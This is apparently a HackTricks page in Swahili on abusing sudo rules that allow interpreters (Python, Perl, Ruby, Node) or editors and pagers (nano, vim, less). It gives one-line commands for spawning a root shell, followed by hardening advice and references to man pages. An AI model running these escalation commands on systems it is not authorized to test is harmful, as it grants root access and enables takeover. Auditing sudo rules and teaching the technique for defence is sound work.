# Abuse ya Amri za Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters Zinazoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha interpreter kama root, ichukulie kama direct code execution. Interpreters zimeundwa kutekeleza code holela, kwa hiyo rule inayoruhusu `python3`, `perl`, `ruby`, `lua`, `node`, au binaries zinazofanana kwa kawaida ni sawa na root command execution isipokuwa arguments zimewekewa mipaka na kuthibitishwa kwa ukali.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Utaratibu wa kawaida wa ukaguzi: kwanza orodhesha privileges za mtumiaji, kisha tekeleza Python statement ukitumia option ya interpreter ya `-c`.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Mifano mingine ya interpreters imeonyeshwa hapa chini; interpreters waliotajwa wanaandika utekelezaji wa inline-code au APIs za child-process.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Njia kamili ni muhimu. Ikiwa sudo rule inaruhusu `/usr/bin/python3`, tumia njia hiyo kamili wakati wa uthibitishaji.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors zinazoruhusiwa na sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha interactive editor kama root, ichukulie kama sehemu ya utekelezaji wa amri, si ruhusa isiyo na madhara ya kuhariri faili. Editors mara nyingi zinaweza kutekeleza shell commands, kusoma arbitrary files, kuandika arbitrary files, au kuita external helpers kutoka ndani ya editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Mtiririko wa kawaida wa ukaguzi: orodhesha privileges za mtumiaji, kisha endesha kila editor au pager iliyoruhusiwa kwa kutumia sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Utekelezaji wa amri ya Nano

Wakati `nano` inaruhusiwa kupitia sudo, utekelezaji wa amri unaweza kufikiwa kutoka kwenye interface ya editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Kisha toa amri kama vile `id` au `/bin/sh` kwenye kidokezo cha amri cha nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Ikiwa shell shirikishi haina mitiririko ya terminali inayoweza kutumika, aina hii ya redirection hupeleka standard output na error yake kwenye descriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Mfuatano halisi wa vitufe unaweza kutofautiana kulingana na toleo la nano na chaguo za build, lakini suala la usalama ni lilelile: editor inaendeshwa kama root na inaweza kutekeleza external commands.<sup>[[1]](#references)[[12]](#references)</sup>

### Njia nyingine za kawaida za kutoroka editor

Vim-style editors kwa kawaida huruhusu kutekeleza commands kupitia `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pagers kama `less` pia zinaweza kufichua utekelezaji wa shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Maelezo ya kujilinda

- Epuka kuruhusu interpreters au interactive editors kupitia sudo.<sup>[[1]](#references)</sup>
- Pendelea wrappers zisizobadilika, zinazomilikiwa na root, zinazotekeleza kitendo kimoja maalum cha kiutawala.<sup>[[1]](#references)[[2]](#references)</sup>
- Ikiwa interpreter haiwezi kuepukwa, zuia exact script path na uzuie user-controlled arguments, writable imports, `PYTHONPATH`, pamoja na unsafe environment preservation.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Ikiwa kuhariri faili kunahitajika, zuia exact file path na uzingatie `sudoedit` ukiwa na patched sudo versions na strict environment handling.<sup>[[1]](#references)[[2]](#references)</sup>
- Kagua `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, na logging, lakini usizichukulie kama sandbox kamili.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line na environment — nyaraka za Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — interfaces mbalimbali za operating system — nyaraka za Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — jinsi ya kutekeleza Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — nyaraka za Perl](https://perldoc.perl.org/functions/exec)
- [7] [Chaguo za command-line za Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — nyaraka za Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API ya command-line — nyaraka za Node.js](https://nodejs.org/api/cli.html)
- [10] [Child process — nyaraka za Node.js](https://nodejs.org/api/child_process.html)
- [11] [Ukurasa wa man wa Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
